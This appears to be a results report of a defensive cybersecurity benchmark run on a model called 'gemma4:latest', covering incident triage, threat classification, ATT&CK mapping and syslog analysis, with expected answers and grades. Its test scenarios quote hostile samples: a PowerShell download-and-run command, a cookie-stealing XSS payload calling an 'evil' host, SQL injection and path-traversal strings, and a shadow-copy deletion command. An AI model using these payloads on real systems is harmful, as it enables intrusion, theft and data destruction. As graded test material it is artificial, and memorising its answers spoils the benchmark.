# Cybersecurity benchmark — `gemma4:latest`
Model: `gemma4:latest`
Run started: 2026-05-06 04:10:19

## Summary

| Section | Correct | Total | Accuracy |
|---|---|---|---|
| Incident recognition | 7 | 7 | 100% |
| Threat classification | 7 | 7 | 100% |
| MITRE ATT&CK mapping | 7 | 10 | 70% |
| Syslog triage (raw) | 7 | 8 | 88% |
| Syslog triage (drain3) | 7 | 8 | 88% |
| **Overall (with drain3)** | **28** | **32** | **88%** |

## Resource usage

Latency in seconds. GPU util/memory from `nvidia-smi`, CPU/RAM from `psutil`. Sampled every 250ms during each model call; peak is the max sample within the window.

| Section | n | Total s | Avg s | p50 s | p95 s | Max s | Peak GPU% | Avg GPU% | Peak GPU MB | Peak CPU% | Avg CPU% | Peak RAM MB |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| Incident | 7 | 9.8 | 1.39 | 0.79 | 2.68 | 3.31 | 71% | 29% | 10612 | 18% | 5% | 33516 |
| Threat | 7 | 21.1 | 3.02 | 3.16 | 3.59 | 3.90 | 77% | 60% | 10612 | 20% | 11% | 33561 |
| MITRE | 10 | 32.0 | 3.20 | 3.34 | 4.24 | 7.01 | 77% | 62% | 10612 | 41% | 11% | 33609 |
| Syslog (raw) | 8 | 31.1 | 3.88 | 4.13 | 5.14 | 5.85 | 77% | 62% | 10612 | 27% | 10% | 34566 |
| Syslog (drain3) | 8 | 36.4 | 4.55 | 4.68 | 5.48 | 5.75 | 79% | 62% | 10612 | 59% | 11% | 35067 |
| **Overall** | **40** | **130.4** | **3.26** | **3.34** | **5.75** | **7.01** | **79%** | **56%** | **10612** | **59%** | **10%** | **35067** |

## 1. Incident recognition (binary)

### INC-1 — expected: **benign** — PASS (0.7s · GPU 0%/10612MB · CPU 6% · RAM 33339MB)
_Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.

_Reply_: Benign. The activity aligns with normal user behavior and established access patterns.

### INC-2 — expected: **incident** — PASS (0.8s · GPU 47%/10612MB · CPU 5% · RAM 33379MB)
_Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.

_Reply_: Incident. The combination of unusual geographic location, off-hours access, and rapid bulk connection attempts strongly suggests credential compromise and lateral movement.

### INC-3 — expected: **incident** — PASS (0.8s · GPU 47%/10612MB · CPU 6% · RAM 33397MB)
_Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.

_Reply_: Incident. The high volume of requests from numerous IPs targeting the login page strongly indicates a brute-force attack, regardless of the few successful logins.

### INC-4 — expected: **benign** — PASS (0.7s · GPU 0%/10612MB · CPU 6% · RAM 33420MB)
_Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.

_Reply_: Benign. The activity is routine, predictable, and completes successfully with no anomalous indicators.

### INC-5 — expected: **incident** — PASS (3.3s · GPU 67%/10612MB · CPU 7% · RAM 33496MB)
_Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')

_Reply_: Incident. This pattern represents a classic malicious payload delivery, where a document (Winword) executes PowerShell to download and run an external script from the internet.

### INC-6 — expected: **benign** — PASS (0.7s · GPU 67%/10612MB · CPU 5% · RAM 33505MB)
_Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.

_Reply_: Benign. Passing unit tests only confirm functional correctness, not security vulnerabilities.

### INC-7 — expected: **incident** — PASS (2.7s · GPU 71%/10612MB · CPU 18% · RAM 33516MB)
_Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.

_Reply_: Incident. The high volume of unique subdomain queries, particularly with TXT records, strongly suggests DNS tunneling or systematic reconnaissance.

## 2. Threat-type classification

### THR-1 — accepted keywords: ['ransomware'] — PASS (2.3s · GPU 71%/10612MB · CPU 14% · RAM 33531MB)
_Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.

_Reply_: Ransomware Attack.

The malware encrypts files, rendering them inaccessible, and demands a ransom payment (in this case, 2 BTC) for the decryption key.

_Match_: 'ransomware'

### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (3.2s · GPU 76%/10612MB · CPU 20% · RAM 33561MB)
_Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.

_Reply_: **Business Email Compromise (BEC)**

The attacker is impersonating a high-level executive (CFO) to trick the recipient into initiating an unauthorized, urgent wire transfer. The typo in the domain is a common tactic used to bypass basic email filters and establish false legitimacy.

_Match_: 'bec'

### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (2.5s · GPU 76%/10612MB · CPU 17% · RAM 33540MB)
_Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.

_Reply_: **SQL Injection**

The attacker is injecting malicious SQL syntax (`OR '1'='1'--`) into the input field to bypass authentication logic. This forces the database query to evaluate as true, allowing unauthorized access.

_Match_: 'sql injection'

### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (2.5s · GPU 77%/10612MB · CPU 17% · RAM 33550MB)
_Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.

_Reply_: **Cross-Site Scripting (XSS)**

The application fails to sanitize or encode user input, allowing the attacker's script to execute in the victim's browser. This payload steals the user's session cookies and exfiltrates them to an attacker-controlled server.

_Match_: 'xss'

### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — PASS (3.9s · GPU 77%/10612MB · CPU 15% · RAM 33544MB)
_Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.

_Reply_: **Credential Dumping**

The attacker executes code to target the Local Security Authority Subsystem Service (LSASS) process, which holds sensitive credentials (hashes, plaintext passwords). The process injects into LSASS to dump the memory contents, thereby stealing credentials, and then exfiltrates this data over the network.

_Match_: 'credential'

### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (3.6s · GPU 76%/10612MB · CPU 16% · RAM 33536MB)
_Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.

_Reply_: **DNS Amplification Attack**

The attackers spoof internal source IPs and send small DNS queries to open, public DNS resolvers. These resolvers respond with much larger DNS records (the amplification), overwhelming the target's public DNS server with massive, high-volume UDP traffic (a Distributed Denial of Service, or DDoS).

_Match_: 'ddos'

### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — PASS (3.2s · GPU 76%/10612MB · CPU 19% · RAM 33542MB)
_Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.

_Reply_: **Supply Chain Attack**

The attacker compromised a trusted, upstream component (the vendor's build server) to inject malicious code into legitimate software updates, bypassing standard security controls and exploiting trust.

_Match_: 'supply chain'

## 3. MITRE ATT&CK technique mapping

**Per-case results**

| Case | Scenario | Accepted IDs | Detected | Result |
|---|---|---|---|---|
| ATT-1 | An attacker sends a Word document containing a malicious macro to a... | `T1566.001, T1566, T1204.002, T1204` | `T1059` | FAIL |
| ATT-2 | Adversary uses Mimikatz to extract plaintext passwords and NTLM has... | `T1003.001, T1003` | `T1003.001` | PASS |
| ATT-3 | Attacker creates a new scheduled task on the victim host to run the... | `T1053.005, T1053` | `T1053` | PASS |
| ATT-4 | After initial access, the attacker uses 'net group "Domain Admins" ... | `T1087.002, T1087, T1018, T1482` | `T1082` | FAIL |
| ATT-5 | Adversary establishes persistence by adding a value under HKCU\Soft... | `T1547.001, T1547` | `T1547.001` | PASS |
| ATT-6 | C2 beaconing traffic is encoded as DNS TXT record queries to attack... | `T1071.004, T1071, T1048.003, T1048` | `T1071.004` | PASS |
| ATT-7 | Attacker uses PsExec from a compromised workstation to execute a re... | `T1021.002, T1021, T1570, T1569.002` | `T1021.002` | PASS |
| ATT-8 | Before encrypting victim files, the ransomware deletes Windows Volu... | `T1490` | `T1562.001` | FAIL |
| ATT-9 | A binary uses base64-encoded PowerShell with the -EncodedCommand fl... | `T1027, T1059.001, T1140` | `T1059.001` | PASS |
| ATT-10 | Attacker compresses sensitive files into a password-protected RAR a... | `T1560.001, T1560` | `T1560` | PASS |

### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — FAIL (7.0s · GPU 76%/10612MB · CPU 41% · RAM 33572MB)
_Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.

_Reply_: T1059 Command Execution

_Detected IDs_: T1059

### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (2.0s · GPU 77%/10612MB · CPU 9% · RAM 33519MB)
_Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.

_Reply_: T1003.001, LSASS Memory

_Detected IDs_: T1003.001

### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — PASS (2.6s · GPU 77%/10612MB · CPU 12% · RAM 33503MB)
_Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.

_Reply_: T1053, Scheduled Task/Job

_Detected IDs_: T1053

### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — FAIL (3.3s · GPU 71%/10612MB · CPU 20% · RAM 33524MB)
_Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.

_Reply_: T1082, System Information Discovery

_Detected IDs_: T1082

### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — PASS (0.7s · GPU 70%/10612MB · CPU 7% · RAM 33546MB)
_Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.

_Reply_: T1547.001, Registry Run Keys / Startup Folder

_Detected IDs_: T1547.001

### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — PASS (2.2s · GPU 76%/10612MB · CPU 16% · RAM 33509MB)
_Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.

_Reply_: T1071.004, DNS

*(Alternative/Supporting Technique: T1573, Encrypted Channel)*

_Detected IDs_: T1071.004

### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — PASS (3.6s · GPU 75%/10612MB · CPU 18% · RAM 33508MB)
_Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.

_Reply_: T1021.002, Remote Services: SMB/Windows Admin Shares

_Detected IDs_: T1021.002

### ATT-8 — accepted IDs: ['T1490'] — FAIL (4.2s · GPU 77%/10612MB · CPU 18% · RAM 33599MB)
_Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.

_Reply_: T1562.001, Impair Defenses: Disable or Modify System Utilities

_Detected IDs_: T1562.001

### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — PASS (3.4s · GPU 75%/10612MB · CPU 27% · RAM 33609MB)
_Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.

_Reply_: T1059.001, PowerShell

_Detected IDs_: T1059.001

### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — PASS (2.8s · GPU 72%/10612MB · CPU 17% · RAM 33585MB)
_Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.

_Reply_: T1560 - Archive via Utility

_Detected IDs_: T1560

## 4. Raw syslog triage (binary) — baseline vs drain3-augmented

### SYS-1 — SSH brute force followed by successful login — expected: **incident**
_Logs_:
```
Mar 10 03:41:02 webhost sshd[28401]: Failed password for invalid user admin from 185.220.101.45 port 47812 ssh2
Mar 10 03:41:05 webhost sshd[28403]: Failed password for invalid user root from 185.220.101.45 port 47815 ssh2
Mar 10 03:41:08 webhost sshd[28405]: Failed password for invalid user oracle from 185.220.101.45 port 47820 ssh2
Mar 10 03:41:11 webhost sshd[28407]: Failed password for invalid user postgres from 185.220.101.45 port 47824 ssh2
Mar 10 03:41:14 webhost sshd[28409]: Failed password for invalid user git from 185.220.101.45 port 47829 ssh2
Mar 10 03:41:17 webhost sshd[28411]: Failed password for invalid user test from 185.220.101.45 port 47833 ssh2
Mar 10 03:41:20 webhost sshd[28413]: Failed password for ubuntu from 185.220.101.45 port 47837 ssh2
Mar 10 03:43:21 webhost sshd[28571]: Accepted password for ubuntu from 185.220.101.45 port 47891 ssh2
Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

_drain3 templates_:
```
[x6] Mar 10 <*> webhost <*> Failed password for invalid user <*> from 185.220.101.45 port <*> ssh2
[x2] Mar 10 <*> webhost <*> <*> password for ubuntu from 185.220.101.45 port <*> ssh2
[x1] Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

**Baseline (raw only)** — PASS (2.7s · GPU 72%/10612MB · CPU 26% · RAM 33576MB)
_Reply_: Incident. The logs show a clear pattern of brute-force attempts against multiple user accounts, culminating in a successful login, indicating a potential unauthorized access event.

**With drain3 summary** — PASS (5.7s · GPU 76%/10612MB · CPU 12% · RAM 33551MB)
_Reply_: Incident. The high count of 6 failed password attempts targeting invalid users strongly indicates a brute-force attack attempt.

### SYS-2 — Normal pubkey login from internal range — expected: **benign**
_Logs_:
```
Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

_drain3 templates_:
```
[x1] Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
[x1] Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
[x1] Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

**Baseline (raw only)** — PASS (0.7s · GPU 76%/10612MB · CPU 5% · RAM 33546MB)
_Reply_: Benign. The logs show a successful, expected user login using public key authentication, followed by session establishment.

**With drain3 summary** — PASS (2.8s · GPU 69%/10612MB · CPU 13% · RAM 33588MB)
_Reply_: Benign. The low count of [x1] across all templates indicates a single, successful, routine user login sequence.

### SYS-3 — Daily cron run — expected: **benign**
_Logs_:
```
Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
[x1] Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
[x1] Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

**Baseline (raw only)** — PASS (4.1s · GPU 77%/10612MB · CPU 7% · RAM 33581MB)
_Reply_: Benign. The logs document routine, scheduled system maintenance activities, including standard cron job execution and the graceful reloading of the rsyslog daemon.

**With drain3 summary** — PASS (4.7s · GPU 71%/10612MB · CPU 7% · RAM 33573MB)
_Reply_: Benign
The low count of 1 across all templates indicates routine system maintenance (cron jobs and service restarts) rather than evidence of an attack.

### SYS-4 — SQL injection probes in Apache access log — expected: **incident**
_Logs_:
```
185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:04 +0000] "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 4129
185.62.190.13 - - [10/Mar/2026:14:22:05 +0000] "GET /products.php?id=1;DROP+TABLE+users-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:06 +0000] "GET /products.php?id=1+AND+SLEEP(5)-- HTTP/1.1" 200 4129
```

_drain3 templates_:
```
[x3] 185.62.190.13 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
[x1] 185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
```

**Baseline (raw only)** — PASS (4.1s · GPU 73%/10612MB · CPU 12% · RAM 33528MB)
_Reply_: Incident. The logs demonstrate multiple, rapid attempts to exploit common web vulnerabilities, specifically various forms of SQL Injection, indicating malicious probing.

**With drain3 summary** — PASS (4.8s · GPU 78%/10612MB · CPU 15% · RAM 33518MB)
_Reply_: Incident. The high count of matching logs across multiple attack-shaped templates (e.g., the specific SQL injection probe and the general repeated GET requests) indicates a targeted probing attempt.

### SYS-5 — Sudo adding service account to sudo group at 03:17 — expected: **incident**
_Logs_:
```
Mar 10 03:17:42 webhost sudo:      bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 03:17:42 webhost sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
[x1] Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
[x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

**Baseline (raw only)** — FAIL (5.9s · GPU 73%/10612MB · CPU 9% · RAM 33564MB)
_Reply_: Benign. The logs document a standard, successful administrative action where a user modified group membership using `usermod`.

**With drain3 summary** — FAIL (4.4s · GPU 79%/10612MB · CPU 21% · RAM 33585MB)
_Reply_: Benign. The pattern summary shows only a small number of distinct templates, all with a count of [x1], indicating a single, successful administrative action rather than repeated or failed attack attempts.

### SYS-6 — Path traversal probes in Apache access log — expected: **incident**
_Logs_:
```
198.51.100.7 - - [10/Mar/2026:11:03:18 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841
198.51.100.7 - - [10/Mar/2026:11:03:19 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 891
198.51.100.7 - - [10/Mar/2026:11:03:20 +0000] "GET /download?file=....//....//etc/hosts HTTP/1.1" 200 412
```

_drain3 templates_:
```
[x3] 198.51.100.7 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
```

**Baseline (raw only)** — PASS (5.1s · GPU 74%/10612MB · CPU 23% · RAM 34566MB)
_Reply_: Incident. The logs demonstrate repeated directory traversal attempts targeting sensitive system files like `/etc/passwd` and `/etc/shadow`, indicating an active exploitation attempt.

**With drain3 summary** — PASS (5.5s · GPU 79%/10612MB · CPU 24% · RAM 35067MB)
_Reply_: Incident. The high count of [x3] matching a template involving repeated path traversal attempts targeting sensitive system files indicates active reconnaissance.

### SYS-7 — Normal authenticated web session — expected: **benign**
_Logs_:
```
10.0.4.22 - alice [10/Mar/2026:10:14:02 +0000] "GET /dashboard HTTP/1.1" 200 18421 "https://intranet.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "GET /static/app.js HTTP/1.1" 200 84219 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "POST /api/v1/metrics HTTP/1.1" 200 142 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

_drain3 templates_:
```
[x3] 10.0.4.22 - alice <*> +0000] <*> <*> HTTP/1.1" 200 <*> <*> "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

**Baseline (raw only)** — PASS (3.9s · GPU 77%/10612MB · CPU 27% · RAM 33877MB)
_Reply_: Benign. The logs show a standard sequence of successful web requests (GET for pages/assets, POST for data submission) consistent with normal user interaction with an internal application.

**With drain3 summary** — PASS (3.9s · GPU 77%/10612MB · CPU 30% · RAM 33758MB)
_Reply_: Benign
The pattern summary shows a low count of three matching a standard, successful user workflow (HTTP 200s), which is characteristic of routine activity rather than an attack.

### SYS-8 — Windows 4625 burst then 4624 from same IP — expected: **incident**
_Logs_:
```
Mar 10 02:18:14 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:16 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:18 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:21 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:24 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

_drain3 templates_:
```
[x5] Mar 10 <*> dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
[x1] Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

**Baseline (raw only)** — PASS (4.6s · GPU 76%/10612MB · CPU 23% · RAM 33612MB)
_Reply_: Incident. The repeated 4625 events indicate a brute-force attack attempt against the Administrator account, culminating in a successful login (4624) from the same source IP.

**With drain3 summary** — PASS (4.6s · GPU 79%/10612MB · CPU 59% · RAM 33557MB)
_Reply_: Incident. The high count of five failed login attempts (EventID=4625) against the Administrator account strongly suggests a brute-force attack attempt.
